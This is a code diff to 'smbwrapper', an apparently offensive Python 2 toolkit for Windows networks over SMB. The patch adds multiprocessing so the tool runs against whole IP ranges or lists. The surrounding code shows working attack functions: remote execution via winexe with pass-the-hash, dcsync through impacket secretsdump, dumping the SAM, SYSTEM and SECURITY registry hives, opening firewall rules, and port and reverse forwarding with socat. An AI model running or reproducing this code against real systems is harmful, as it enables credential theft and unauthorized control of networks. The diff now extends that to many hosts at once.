@@ -17,11 +17,19 @@
 
 import sys, os, time, string, socket, subprocess, inspect
 
+from multiprocessing import Process
+
+try:
+	from netaddr import IPNetwork
+except:
+	print "[!] Please install the python-netaddr extension."
+	sys.exit(1)
+
 try:
 	import sqlite3
 except:
 	print "[!] Please install python-sqlite3 extension."
-	sys.exit(0)
+	sys.exit(1)
 
 __version__ = '1.0.1alpha'
 __author__ = 'jrm`'
@@ -41,6 +49,7 @@ TOOLS = {
 	'logparser': BASEDIR + '/win/logparser.exe',
 	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
 }
+
 CONF = {
 	'system': False,
 	'creds_file': os.environ['HOME'] + '/.smbwrapper.vault',
@@ -50,6 +59,18 @@ CONF = {
 	'smb_hash': '',
 	'smb_ip': '',
 }
+
+def start_threaded_command(command, ip):
+	try:
+		CONF['smb_ip'] = socket.gethostbyname(ip)
+	except socket.gaierror:
+		text("[!] Unable to resolve hostname for %s" % (ip), 1)
+		return 1
+
+	if sys.argv[1] not in ['rdp', 'mount']:
+		check_host()
+
+	globals()[command]()
 
 def main():
 	sys.argv[0] = os.path.basename(sys.argv[0])
@@ -78,25 +99,55 @@ def main():
 
 	# Check command validity and jump to main function
 	command = 'smb_%s' % sys.argv[1]
+
 	if command in dict(get_commands()).keys():
 
 		if len(sys.argv) < 3:
 			usage()
 
 		if sys.argv[1] not in ['creds', 'hash'] and 'update' not in sys.argv:
+			#
+			# Here starts the multiprocessing part.
+			#
+			# Important note:
+			#
+			# Variable definition on a multiprocessed "thread" is independant
+			#   from the others threads.
+			# This means a variable defined in the main-thread will be available
+			#   in the childs but every changes made in the childs won't be
+			#   available for the main thread or the other threads.
+			# In this particular case, this is greatly helping us.
 
-			try:
-				CONF['smb_ip'] = socket.gethostbyname(sys.argv[2])
-			except socket.gaierror:
-				text("[!] Unable to resolve hostname.", 1)
-			except:
-				usage()
+			ip_list = []
 
-			if sys.argv[1] not in ['rdp', 'mount']:
-				check_host()
+			# First, we need to check if the ip specified is:
+			#   - A file containing unique IPs
+			#   - An ip specification (ip/range)
+			# Whatever the mode is, we need to compute all possible IPs from this.
+			if os.path.exists(sys.argv[2]):
+				with open(sys.argv[2], "r") as f:
+					for line in f:
+						current = [ str(i) for i in IPNetwork(line.strip()) ]
+						ip_list += current
+			else:
+				ip_list = IPNetwork(sys.argv[2])
 
-		globals()[command]()
+			# We keep track of a process list to join them later on.
+			process_list = []
 
+			for ip in ip_list:
+				ip = str(ip).strip()
+
+				# Start the threads and add them to the process list.
+				p = Process(target=start_threaded_command, args=(command, ip))
+				p.start()
+				process_list.append(p)
+
+			# Finally, we wait for each thread to finish.
+			for p in process_list:
+				p.join()
+		else:
+			globals()[command]()
 	else:
 		text("[!] Not a valid smbwrapper command.", 1)
 
@@ -120,8 +171,8 @@ def text(txt, e = False):
 
 	print ret
 
-	if e is not False:
-		sys.exit(0)
+	if e:
+		sys.exit(1)
 
 def check_vault():
 
@@ -150,12 +201,12 @@ def check_tool(tool):
 
 def check_host():
 	try:
-		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		sock.settimeout(2)
 		sock.connect((CONF['smb_ip'], 445))
 		sock.close()
 	except:
-		text("[!] %s: port 445 unreachable" % sys.argv[2], 1)
+		text("[!] %s: port 445 unreachable" % CONF['smb_ip'], 1)
 
 def check_path(path):
 	if '$ARCH$' in path:
@@ -197,7 +248,7 @@ def usage():
 
 	else:
 		print ""
-		print color("Command usage:\n", 7, 4);	
+		print color("Command usage:\n", 7, 4);
 
 	for cmd in get_commands():
 		if c == 'help' or c == cmd[0][4:]:
@@ -243,7 +294,7 @@ def creds_from_cmdline():
 		CONF['smb_pass'] = ''
 		CONF['smb_hash'] = sys.argv[4]
 		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']
-	
+
 	else:
 		CONF['smb_pass'] = sys.argv[4]
 		CONF['smb_hash'] = ntlm_hash(sys.argv[4])
@@ -281,7 +332,7 @@ def download_file(src, dst, statusbar = True):
 
 	meta = u.info()
 	file_size = int(meta.getheaders("Content-Length")[0])
-	
+
 	if file_size == 0:
 		text("[!] Error: File empty.")
 
@@ -293,16 +344,16 @@ def download_file(src, dst, statusbar = True):
 	try:
 		while True:
 			buffer = u.read(block_sz)
-		
+
 			if not buffer:
 				break
-		
+
 			file_size_dl += len(buffer)
 			f.write(buffer)
-		
+
 			status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
 			status = status + chr(8)*(len(status)+1)
-		
+
 			if statusbar:
 				sys.stdout.write(status)
 
@@ -328,7 +379,7 @@ def smbclient(cmd):
 	run.append(cmd)
 
 	process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
-	
+
 	ret = process.stdout.read()
 	ret = ret.replace('\x00', '')
 	return ret.strip()
@@ -350,7 +401,7 @@ def winexe(cmd):
 
 	if not cmd.lower().startswith('cmd'):
 		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
-		
+
 		ret = process.stdout.read()
 		ret = ret.replace('\x00', '')
 		return ret.strip()
@@ -364,7 +415,7 @@ def os_architecture():
 
 def screen_resolution():
 	xrandr = subprocess.Popen(['xrandr', '--current'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()
-	
+
 	for l in xrandr:
 		if '*' in l:
 			return l.split()[0].split('x')
@@ -400,7 +451,7 @@ def smb_creds():
 	if sys.argv[2] == 'list':
 		cursor = sqlite3.connect(CONF['creds_file'])
 		res = cursor.execute('SELECT * FROM creds')
-		
+
 		for row in res:
 			print 'Active   : %s' % ('*' if row[0] != 0 else '')
 			print 'Username : %s' % row[1]
@@ -408,7 +459,7 @@ def smb_creds():
 			print 'NT Hash  : %s' % row[3]
 			print 'Comment  : %s' % row[4]
 			print "-- "
-		
+
 		cursor.close()
 	else:
 		u = p = h = c = ''
@@ -461,7 +512,7 @@ def smb_creds():
 			cursor.close()
 
 	if sys.argv[2] == 'del':
-		
+
 		if len(sys.argv) == 4:
 
 			cursor = sqlite3.connect(CONF['creds_file'])
@@ -477,7 +528,7 @@ def smb_creds():
 			cursor.close()
 
 	if sys.argv[2] == 'use':
-		
+
 		if len(sys.argv) == 4:
 
 			cursor = sqlite3.connect(CONF['creds_file'])
@@ -501,7 +552,8 @@ def smb_exec():
 
 	set_creds(4)
 	check_creds()
-	print winexe(' '.join(sys.argv[3:]))
+	ret = winexe(' '.join(sys.argv[3:]))
+	print "[*] Result for %s\n%s" % (CONF['smb_ip'], ret)
 
 def smb_upexec():
 	"""
@@ -555,7 +607,7 @@ def smb_dcsync():
 		import secretsdump
 	except:
 		print color('[!] Please install python-impacket to use this function.')
-		sys.exit(0)
+		sys.exit(1)
 
 	set_creds(3)
 
@@ -600,7 +652,7 @@ def smb_creddump():
 
 	tmpfile = '/tmp/cred_run.bat'
 
-	bat = ['@echo off', 'cd \\windows\\temp', 
+	bat = ['@echo off', 'cd \\windows\\temp',
 		'reg save HKLM\\SAM sam.hive /y',
 		'reg save HKLM\\SYSTEM system.hive /y',
 		'reg save HKLM\\SECURITY security.hive /y']
@@ -648,7 +700,7 @@ def smb_creddump():
 					s = s.translate(FILTER)
 					result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
 					N += length
-				
+
 				print k
 				print result
 	except:
@@ -702,7 +754,7 @@ def smb_scrshot():
 		text("[*] Screenshot saved under %s." % filename)
 		os.system('display "%s" &' % filename)
 		text("[*] Done.")
-	
+
 	else:
 		text("[!] Failed. Is the user logged in?.", 1)
 
@@ -743,7 +795,7 @@ def smb_fwrule(action = None, param = None):
 	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
 	Create or remove a rule in the Windows firewall
 	"""
-	
+
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(5)
@@ -759,13 +811,13 @@ def smb_fwrule(action = None, param = None):
 	param = str(param)
 
 	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
-	
+
 	if param.isdigit(): # Adding a port rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
+		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' %
 			(action, name, 'action=allow' if action == 'add' else '', param))
 
 	else: # Adding a program rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
+		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' %
 			(action, name, 'action=allow' if action == 'add' else '', param))
 
 	if 'Ok.' in ret:
@@ -864,7 +916,7 @@ def smb_portfwd(lport = None, rhost = None, rport = None):
 	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
 	Forward a remote port to a remote address
 	"""
-	
+
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(6)
@@ -879,15 +931,15 @@ def smb_portfwd(lport = None, rhost = None, rport = None):
 
 	text("[*] Setting up port forwarding...")
 
-	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" % 
+	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" %
 		(lport, rport, rhost))
-	
+
 	text("[i] Connections to %s:%d are now forwarded to %s:%d" % (CONF['smb_ip'], lport, rhost, rport))
 	text("[i] Hit CTRL+C when done...")
 
 	try:
 		raw_input()
-	
+
 	except KeyboardInterrupt:
 
 		sys.stdout.write('\r')
@@ -901,7 +953,7 @@ def smb_revfwd(lport = None, rhost = None, rport = None):
 	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
 	Reverse-forward a remote address/port locally
 	"""
-	
+
 	if len(inspect.stack()) == 3: # Function called directly from command line
 
 		set_creds(6)
@@ -928,7 +980,7 @@ def smb_revfwd(lport = None, rhost = None, rport = None):
 	winexe('\\windows\\temp\\tar.exe xf /windows/temp/socat.tar -C /windows/temp')
 
 	text("[*] Setting up local listener...")
-	process = subprocess.Popen([ TOOLS['socat'], 
+	process = subprocess.Popen([ TOOLS['socat'],
 		'TCP-LISTEN:%d,bind=%s,reuseaddr,fork' % (lport, local_if),
 		'TCP-LISTEN:56789,reuseaddr' ])
 
@@ -972,7 +1024,7 @@ def smb_mbsa():
 
 	import tarfile
 	archive = tarfile.open('/tmp/mbsa.tar', mode='w')
-	
+
 	try:
 		for k, v in TOOLS['mbsa'].iteritems():
 			archive.add(v, arcname=os.path.basename(v))
